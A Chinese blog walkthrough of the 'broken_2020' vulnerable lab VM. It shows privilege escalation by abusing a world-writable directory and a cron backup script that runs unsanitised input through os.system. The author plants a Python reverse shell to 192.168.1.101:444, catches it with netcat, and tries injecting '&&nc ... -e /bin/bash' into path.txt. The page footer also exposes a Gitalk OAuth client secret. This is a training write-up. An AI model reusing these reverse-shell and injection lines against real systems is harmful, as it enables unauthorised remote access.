+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/back$ <span class="hljs-built_in">ls</span> ..<br><span class="hljs-built_in">ls</span> ..<br>back       etc             lib         media  run   usr<br>backup.py  flag.txt        lib32       mnt    sbin  var<br>bin        home            lib64       opt    srv   vmlinuz<br>boot       initrd.img      libx32      proc   sys   vmlinuz.old<br>dev        initrd.img.old  lost+found  root   tmp<br>www-data@broken:/$ <span class="hljs-built_in">cat</span> backup.py<br><span class="hljs-built_in">cat</span> backup.py<br>import os<br>import datetime<br>size = os.path.getsize(<span class="hljs-string">&quot;/home/alice/backup/path.txt&quot;</span>)<br><br><span class="hljs-keyword">if</span> size &gt; 3 :<br><br>        file = open(<span class="hljs-string">&quot;/home/alice/backup/path.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>        path = file.read().strip()<br>        file.close()<br>        cmd = <span class="hljs-string">&quot;rsync -a &quot;</span>+path+<span class="hljs-string">&quot; /home/alice/backup --exclude back --exclude backup.py&amp;&amp; chown -R www-data:alice /home/alice/backup &amp;&amp; chmod -R 777 /home/alice/backup&quot;</span><br>        os.system(cmd)<br><span class="hljs-built_in">date</span> = str(datetime.datetime.now())<br><span class="hljs-built_in">log</span> = open(<span class="hljs-string">&quot;/home/alice/backup/logbot.log&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>log.write(<span class="hljs-string">&quot;last check : &quot;</span>+<span class="hljs-built_in">date</span>)<br>log.close()<br></code></pre></td></tr></table></figure>
+
+<p>backup.py 文件主要是对 <code>/home/alice/backup/path.txt</code> 中的路径进行同步备份，并且将备份后的用户权限设置为了一般用户可读。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/back$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 36K<br>152663 drwxr-xr-x  3 root root 4.0K Mar 25  2020 .<br>     2 drwxr-xr-x 19 root root 4.0K Mar 25  2020 ..<br>152665 drwxr-xr-x  2 root root 4.0K Mar 25  2020 backup<br>152673 -rwxr-xr-x  1 root root  493 Mar 25  2020 backup.py<br>152670 -rw-r--r--  1 root root  114 Mar 25  2020 check.py<br>152671 -rwxr-xr-x  1 root root  274 Mar 25  2020 hack.sh<br>152674 -rwxr-xr-x  1 root root  132 Mar 25  2020 load.sh<br>152664 -rw-------  1 root root 1.2K Mar 25  2020 post<br>152672 -rw-------  1 root root 1.2K Mar 25  2020 root<br></code></pre></td></tr></table></figure>
+
+<p>各文件内容如下</p>
+<p><img src="/pic/ed56c647fde127f642ca8800ddf4b1bb_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是核心点还是 alice 用户目录下的 backup 文件夹，目前还是没法实现用户切换或者提权</p>
+<p>这里忽略了一点，卡了很久，文件虽然是可读不可写，但是目录权限是 777 ，这意味着我们可以更改文件名，文件名并不是由文件权限所限制的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/home/alice/script$ <span class="hljs-built_in">mv</span> log.py log.py.bak<br><span class="hljs-built_in">mv</span> log.py log.py.bak<br>www-data@broken:/home/alice/script$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.101&quot;,444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> &gt; log.py<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提前开启监听，等待反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo nc -lvnp 444        <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 444 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.232] 58756<br>alice@broken:/root$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>alice<br>alice@broken:/root$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(alice) gid=1000(alice) groupes=1000(alice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)<br>alice@broken:/root$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>alice@broken:~$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 52K<br>  31 drwxr-xr-x 6 alice alice 4,0K oct.  16 10:25 .<br> 193 drwxr-xr-x 3 root  root  4,0K mars  24  2020 ..<br>7147 drwx------ 2 alice alice 4,0K mars  26  2020 backup<br>6538 lrwxrwxrwx 1 alice alice    9 mars  24  2020 .bash_history -&gt; /dev/null<br>  67 -rw-r--r-x 1 alice alice  220 mars  24  2020 .bash_logout<br>7046 -rw-r--r-- 1 alice alice  570 janv. 31  2010 .bashrc<br>6523 drwxr-xr-x 3 alice alice 4,0K mars  24  2020 .cache<br>7131 -rw-r--r-- 1 alice alice   29 mars  25  2020 flag.txt<br>6842 drwxr-xr-x 3 alice alice 4,0K mars  24  2020 .<span class="hljs-built_in">local</span><br>6841 -rw-r--r-- 1 alice alice  141 mars  25  2020 note.txt<br>  46 -rw-r--r-- 1 alice alice  148 août  17  2015 .profile<br>6859 drwxrwxrwx 2 alice alice 4,0K oct.  16 10:24 script<br>  54 -rw-r--r-- 1 alice alice   66 mars  25  2020 .selected_editor<br>6982 -rw-r--r-- 1 alice alice  173 mars  24  2020 .wget-hsts<br></code></pre></td></tr></table></figure>
+
+<p>发现在 alice 用户权限下，文件夹中多了 backup 文件夹，进入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@broken:~/backup$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 20K<br>7147 drwx------ 2 alice alice 4,0K mars  26  2020 .<br>  31 drwxr-xr-x 6 alice alice 4,0K oct.  16 10:25 ..<br>9698 -rw-r--r-- 1 alice alice   27 mars  26  2020 flag.txt<br>9697 -rw-r--r-- 1 alice alice  150 oct.  16 10:28 logbot.log<br>9696 -rw-r--r-- 1 alice alice  129 mars  26  2020 note.txt<br>9695 -rw-r--r-- 1 alice alice    0 mars  26  2020 path.txt<br></code></pre></td></tr></table></figure>
+
+<p>接下来我尝试了直接写入文件名，但是 <code>logbot.log</code> 提示必须是文件夹，因为我们之前以及看到了定时执行的 backup.py 的内容，其中 path.txt 中的内容是完全可控的，且没有过滤就直接执行了，考虑是否可以在此直接反弹提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@broken:~/backup$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/etc/shadow /home/alice/backup &amp;&amp;nc 192.168.1.101 445 -e /bin/bash &amp;&amp;rsync -a&#x27;</span> &gt;path.txt<br><br>alice@broken:~/backup$ <span class="hljs-built_in">cat</span> logbot.log<br><span class="hljs-built_in">cat</span> logbot.log<br>[INFO] 10:26:01 16/10/2023  : no path <span class="hljs-keyword">in</span> path.txt<br>[SECURITY] 10:39:01 16/10/2023  :  [&amp;] may be an attack attempt. To avoid this the script was interrupted<br></code></pre></td></tr></table></figure>
+
+<p>竟然还有检测 <code>&amp;</code> 这是我没想到的，如果想获取 shadow 文件，只能把 etc 目录整个备份下来，感觉不太行</p>
+<p>关于如何利用此处的可控输入提权，卡了很久。尝试先拿 <code>/root</code> 目录下的内容看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@broken:~/backup$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/root&quot;</span> &gt;path.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/root&quot;</span> &gt;path.txt<br>alice@broken:~/backup$ <span class="hljs-built_in">cd</span> root<br><span class="hljs-built_in">cd</span> root<br>alice@broken:~/backup/root$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 40K<br>7172 drwxrwxrwx 4 www-data alice 4,0K oct.  16 10:25 .<br>7147 drwxrwxrwx 3 www-data alice 4,0K oct.  16 10:46 ..<br>8708 lrwxrwxrwx 1 www-data alice    9 mars  24  2020 .bash_history -&gt; /dev/null<br>8845 -rwxrwxrwx 1 www-data alice  570 janv. 31  2010 .bashrc<br>8728 drwxrwxrwx 3 www-data alice 4,0K mars  24  2020 .cache<br>8852 -rwxrwxrwx 1 www-data alice  508 mars  26  2020 flag.txt<br>8730 drwxrwxrwx 3 www-data alice 4,0K mars  24  2020 .<span class="hljs-built_in">local</span><br>8854 -rwxrwxrwx 1 www-data alice    0 mars  26  2020 log.txt<br>8846 -rwxrwxrwx 1 www-data alice  148 août  17  2015 .profile<br>8848 -rwxrwxrwx 1 www-data alice   66 mars  25  2020 .selected_editor<br>8856 -rwxrwxrwx 1 www-data alice  105 mars  26  2020 test.py<br>8850 -rwxrwxrwx 1 www-data alice  173 mars  24  2020 .wget-hsts<br>alice@broken:~/backup/root$ <span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span> flag.txt<br>Congratulation <span class="hljs-keyword">for</span> the root flag !<br><br>     _________<br>    / ======= \<br>   / __________\<br>  | ___________ |<br>  | | -root-  | |<br>  | |         | |<br>  | |_________| |_____________________________________________________________________<br>  \=____________/                     enjoyed this VM ?                               )<br>  / <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; \                     I love bitcoin                                 /</span><br><span class="hljs-string"> / ::::::::::::: \           1Ba6vFEamUenzrXr4scGQ8QLya7t7zYZ1S                  =D-&#x27;</span><br><span class="hljs-string">(_________________)</span><br></code></pre></td></tr></table></figure>
+
+<p>但还是没提权啊，找了两篇博客看了看，发现似乎这里直接拿 flag 就行。emmmm</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于文件系统权限的理解还不太行，只盯着只读文件了，导致反弹 shell 过于费劲</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>broken_2020 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/10/18e513304239.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/1ef2ffe7f741.html" title="CengBox_1 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CengBox_1 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/fcad96c9b901.html" title="BlackRose 靶机">
+                        <span class="hidden-mobile">BlackRose 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '6ced4d4e918229e316fe28344140c27c'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
